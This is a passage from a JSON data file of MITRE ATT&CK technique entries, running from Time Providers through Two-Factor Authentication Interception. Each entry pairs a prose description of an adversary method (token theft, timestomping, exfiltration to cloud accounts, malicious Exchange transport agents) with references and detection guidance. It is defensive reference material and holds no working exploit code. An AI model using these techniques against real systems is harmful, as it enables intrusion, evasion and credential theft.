2017)\",\"external_references\":[{\"external_id\":\"T1547.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1547/003\"},{\"description\":\"Microsoft. (2018, February 1). Windows Time Service (W32Time). Retrieved March 26, 2018.\",\"source_name\":\"Microsoft W32Time Feb 2018\",\"url\":\"https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-top\"},{\"description\":\"Microsoft. (n.d.). Time Provider. Retrieved March 26, 2018.\",\"source_name\":\"Microsoft TimeProvider\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx\"},{\"description\":\"Lundgren, S. (2017, October 28). w32time. Retrieved March 26, 2018.\",\"source_name\":\"Github W32Time Oct 2017\",\"url\":\"https://github.com/scottlundgren/w32time\"},{\"description\":\"Mathers, B. (2017, May 31). Windows Time Service Tools and Settings. Retrieved March 26, 2018.\",\"source_name\":\"Microsoft W32Time May 2017\",\"url\":\"https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--61afc315-860c-4364-825d-0d62b2e91edc\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-25T15:24:26.476Z\",\"name\":\"Time Providers\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Scott Lundgren, @5twenty9, Carbon Black\"],\"x_mitre_data_sources\":[\"API monitoring\",\"Binary file metadata\",\"DLL monitoring\",\"File monitoring\",\"Loaded DLLs\",\"Process monitoring\"],\"x_mitre_detection\":\"Baseline values and monitor/analyze activity related to modifying W32Time information in the Registry, including application programming interface (API) calls such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code> as well as execution of the W32tm.exe utility. (Citation: Microsoft W32Time May 2017) There is no restriction on the number of custom time providers registrations, though each may require a DLL payload written to disk. (Citation: Github W32Time Oct 2017)\\n\\nThe Sysinternals Autoruns tool may also be used to analyze auto-starting locations, including DLLs listed as time providers. (Citation: TechNet Autoruns)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"SYSTEM\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:12.675Z\",\"external_references\":[{\"external_id\":\"T1099\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1099\"},{\"description\":\"Carvey, H. (2013, July 23). HowTo: Determine/Detect the use of Anti-Forensics Techniques. Retrieved June 3, 2016.\",\"source_name\":\"WindowsIR Anti-Forensic Techniques\",\"url\":\"http://windowsir.blogspot.com/2013/07/howto-determinedetect-use-of-anti.html\"}],\"id\":\"attack-pattern--128c55d3-aeba-469f-bd3e-c8996ab4112a\",\"modified\":\"2020-02-18T16:56:57.039Z\",\"name\":\"Timestomp\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-31T12:42:44.103Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\\n\\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)\",\"external_references\":[{\"external_id\":\"T1070.006\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1070/006\"},{\"description\":\"Carvey, H. (2013, July 23). HowTo: Determine/Detect the use of Anti-Forensics Techniques. Retrieved June 3, 2016.\",\"source_name\":\"WindowsIR Anti-Forensic Techniques\",\"url\":\"http://windowsir.blogspot.com/2013/07/howto-determinedetect-use-of-anti.html\"}],\"id\":\"attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T21:39:46.724Z\",\"name\":\"Timestomp\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Romain Dumont, ESET\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_defense_bypassed\":[\"Host forensic analysis\"],\"x_mitre_detection\":\"Forensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"root\",\"SYSTEM\",\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-18T16:39:06.289Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may duplicate then impersonate another user\'s token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user\'s security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread.\\n\\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.\",\"external_references\":[{\"external_id\":\"T1134.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1134/001\"},{\"description\":\"Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.\",\"source_name\":\"Microsoft Command-line Logging\",\"url\":\"https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing\"}],\"id\":\"attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-26T21:29:18.608Z\",\"name\":\"Token Impersonation/Theft\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"Access tokens\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Windows User Account Control\",\"System access controls\",\"File system access controls\"],\"x_mitre_detection\":\"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\\n\\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code>, <code> ImpersonateLoggedOnUser </code>, and <code> SetThreadToken </code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\\n\\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\\n\\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\",\"external_references\":[{\"external_id\":\"T1205\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1205\"},{\"description\":\"Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.\",\"source_name\":\"Hartrell cd00r 2002\",\"url\":\"https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631\"}],\"id\":\"attack-pattern--451a9977-d255-43c9-b431-66de80130c8c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-07-01T18:27:41.755Z\",\"name\":\"Traffic Signaling\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"revoked\":false,\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Josh Day, Gigamon\"],\"x_mitre_data_sources\":[\"Packet capture\",\"Netflow/Enclave netflow\"],\"x_mitre_defense_bypassed\":[\"Defensive network service scanning\"],\"x_mitre_detection\":\"Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2019-08-30T13:03:04.038Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.\\n\\nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.\\n\\nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018) \",\"external_references\":[{\"external_id\":\"T1537\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1537\"},{\"description\":\"Mueller, R. (2018, July 13). Indictment - United States of America vs. VIKTOR BORISOVICH NETYKSHO, et al. Retrieved September 13, 2018.\",\"source_name\":\"DOJ GRU Indictment Jul 2018\",\"url\":\"https://www.justice.gov/file/1080281/download\"}],\"id\":\"attack-pattern--d4bdbdea-eaec-4071-b4f9-5105e12ea4b6\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-29T23:43:44.256Z\",\"name\":\"Transfer Data to Cloud Account\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Stackdriver logs\",\"Azure activity logs\",\"AWS CloudTrail logs\"],\"x_mitre_detection\":\"Monitor account activity for attempts to share data, snapshots, or backups with untrusted or unusual accounts on the same cloud service provider. Monitor for anomalous file transfer activity between accounts and to untrusted VPCs. \",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Azure\",\"AWS\",\"GCP\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-04-09T16:08:20.824Z\",\"external_references\":[{\"external_id\":\"T1493\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1493\"},{\"description\":\"FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved November 6, 2018.\",\"source_name\":\"FireEye APT38 Oct 2018\",\"url\":\"https://content.fireeye.com/apt/rpt-apt38\"},{\"description\":\"Department of Justice. (2018, September 6). Criminal Complaint - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.\",\"source_name\":\"DOJ Lazarus Sony 2018\",\"url\":\"https://www.justice.gov/opa/press-release/file/1092091/download\"}],\"id\":\"attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8\",\"modified\":\"2020-03-02T14:27:49.110Z\",\"name\":\"Transmitted Data Manipulation\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-02T14:27:00.693Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\\n\\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.\",\"external_references\":[{\"external_id\":\"T1565.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1565/002\"},{\"description\":\"FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved November 6, 2018.\",\"source_name\":\"FireEye APT38 Oct 2018\",\"url\":\"https://content.fireeye.com/apt/rpt-apt38\"},{\"description\":\"Department of Justice. (2018, September 6). Criminal Complaint - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.\",\"source_name\":\"DOJ Lazarus Sony 2018\",\"url\":\"https://www.justice.gov/opa/press-release/file/1092091/download\"}],\"id\":\"attack-pattern--d0613359-5781-4fd2-b5be-c269270be1f6\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-02T15:20:28.455Z\",\"name\":\"Transmitted Data Manipulation\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Packet capture\",\"Network protocol analysis\"],\"x_mitre_detection\":\"Detecting the manipulation of data as at passes over a network can be difficult without the appropriate tools. In some cases integrity verification checks, such as file hashing, may be used on critical files as they transit a network. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data. \",\"x_mitre_impact_type\":[\"Integrity\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\",\"root\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-12-12T15:08:20.972Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \\n\\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. \",\"external_references\":[{\"external_id\":\"T1505.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1505/002\"},{\"description\":\"Microsoft. (2016, June 1). Transport agents. Retrieved June 24, 2019.\",\"source_name\":\"Microsoft TransportAgent Jun 2016\",\"url\":\"https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\"},{\"description\":\"Faou, M. (2019, May). Turla LightNeuron: One email away from remote code execution. Retrieved June 24, 2019.\",\"source_name\":\"ESET LightNeuron May 2019\",\"url\":\"https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf\"}],\"id\":\"attack-pattern--35187df2-31ed-43b6-a1f5-2f1d3d58d3f1\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-25T22:59:59.124Z\",\"name\":\"Transport Agent\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"ESET\",\" Christoffer Strömblad\"],\"x_mitre_data_sources\":[\"Application logs\",\"File monitoring\"],\"x_mitre_detection\":\"Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"SYSTEM\",\"Administrator\",\"root\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1154\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1154\"},{\"description\":\"ss64. (n.d.). trap. Retrieved May 21, 2019.\",\"source_name\":\"Trap Manual\",\"url\":\"https://ss64.com/bash/trap.html\"},{\"description\":\"Cyberciti. (2016, March 29). Trap statement. Retrieved May 21, 2019.\",\"source_name\":\"Cyberciti Trap Statements\",\"url\":\"https://bash.cyberciti.biz/guide/Trap_statement\"}],\"id\":\"attack-pattern--b53dbcc6-147d-48bb-9df4-bcb8bb808ff6\",\"modified\":\"2020-01-24T14:18:13.478Z\",\"name\":\"Trap\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T14:17:43.906Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.\\n\\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap \'command list\' signals</code> where \\\"command list\\\" will be executed when \\\"signals\\\" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)\",\"external_references\":[{\"external_id\":\"T1546.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/005\"},{\"description\":\"ss64. (n.d.). trap. Retrieved May 21, 2019.\",\"source_name\":\"Trap Manual\",\"url\":\"https://ss64.com/bash/trap.html\"},{\"description\":\"Cyberciti. (2016, March 29). Trap statement. Retrieved May 21, 2019.\",\"source_name\":\"Cyberciti Trap Statements\",\"url\":\"https://bash.cyberciti.biz/guide/Trap_statement\"}],\"id\":\"attack-pattern--63220765-d418-44de-8fae-694b3912317d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-24T16:43:02.273Z\",\"name\":\"Trap\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:39.262Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.\",\"external_references\":[{\"external_id\":\"T1127\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1127\"},{\"description\":\"Nelson, M. (2017, November 17). Bypassing Application Whitelisting By Using dnx.exe. Retrieved May 25, 2017.\",\"source_name\":\"engima0x3 DNX Bypass\",\"url\":\"https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/\"},{\"description\":\"Nelson, M. (2016, November 21). Bypassing Application Whitelisting By Using rcsi.exe. Retrieved May 26, 2017.\",\"source_name\":\"engima0x3 RCSI Bypass\",\"url\":\"https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/\"},{\"description\":\"Graeber, M. (2016, August 15). Bypassing Application Whitelisting by using WinDbg/CDB as a Shellcode Runner. Retrieved May 26, 2017.\",\"source_name\":\"Exploit Monday WinDbg\",\"url\":\"http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html\"},{\"description\":\"LOLBAS. (n.d.). Tracker.exe. Retrieved July 31, 2019.\",\"source_name\":\"LOLBAS Tracker\",\"url\":\"https://lolbas-project.github.io/lolbas/OtherMSBinaries/Tracker/\"}],\"id\":\"attack-pattern--ff25900d-76d5-449b-a351-8824e62fc81b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:43:41.298Z\",\"name\":\"Trusted Developer Utilities Proxy Execution\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Casey Smith\",\"Matthew Demaske, Adaptforward\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Application control\"],\"x_mitre_detection\":\"Monitor for abnormal presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\\n\\nUse process monitoring to monitor the execution and arguments of from developer utilities that may be abused. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\\n\\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider\'s access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.\",\"external_references\":[{\"external_id\":\"T1199\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1199\"}],\"id\":\"attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2019-10-11T15:20:53.687Z\",\"name\":\"Trusted Relationship\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Azure activity logs\",\"Stackdriver logs\",\"AWS CloudTrail logs\",\"Application logs\",\"Authentication logs\",\"Third-party application logs\"],\"x_mitre_detection\":\"Establish monitoring for activity conducted by second and third party providers and other trusted entities that may be leveraged as a means to gain access to the network. Depending on the type of relationship, an adversary may have access to significant amounts of information about the target before conducting an operation, especially if the trusted relationship is based on IT services. Adversaries may be able to act quickly towards an objective, so proper monitoring for behavior related to Credential Access, Lateral Movement, and Collection will be important to detect the intrusion.\",\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\",\"AWS\",\"GCP\",\"Azure\",\"SaaS\"],\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2017-05-31T21:31:23.195Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may target two-factor authentication mechanisms, such as smart cards, to gain access to credentials that can be used to access systems, services, and network resources. Use of two or multi-factor authentication (2FA or MFA) is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \\n\\nIf a smart card is used for two-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)\\n\\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user\'s personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)\\n\\nOther methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. (Citation: Operation Emmental)\",\"external_references\":[{\"external_id\":\"T1111\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1111\"},{\"description\":\"Mandiant. (2011, January 27). Mandiant M-Trends 2011. Retrieved January 10, 2016.\",\"source_name\":\"Mandiant M Trends 2011\",\"url\":\"https://dl.mandiant.com/EE/assets/PDF_MTrends_2011.pdf\"},{\"description\":\"Jackson, William. (2011, June 7). RSA confirms its tokens used in Lockheed hack. Retrieved September 24, 2018.\",\"source_name\":\"GCN RSA June 2011\",\"url\":\"https://gcn.com/articles/2011/06/07/rsa-confirms-tokens-used-to-hack-lockheed.aspx\"},{\"description\":\"Sancho, D., Hacquebord, F., Link, R. (2014, July 22). Finding Holes Operation Emmental. Retrieved February 9, 2016.\",\"source_name\":\"Operation Emmental\",\"url\":\"http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-finding-holes-operation-emmental.pdf\"}],\"id\":\"attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-25T20:35:21.672Z\",\"name\":\"Two-Factor Authentication Interception\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"John Lambert, Microsoft Threat Intelligence Center\"],\"x_mitre_data_sources\":[\"API monitoring\",\"Process monitoring\",\"Kernel drivers\"],\"x_mitre_detection\":\"Detecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.\\n\\nSimilar to [Input Capture](https://attack.mitre.org/techniques/T1056), keylogging activity can take various forms but can may be detected via installation of a driver, setting a hook, or usage of particular API calls associated with polling to intercept keystrokes.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_system_requirements\":[\"Smart card Proxy: Use of smart cards for single or multifactor authentication to access to network resources. Attached smart card reader with card inserted.\\n\\nOut-of-band one-time code: Access to the device, service, or communications to intercept the one-time code.\\n\\nHardware token: Access to the seed and algorithm of generating one-time codes.\"],\"x_mitre_version\":\"1.1\"}",
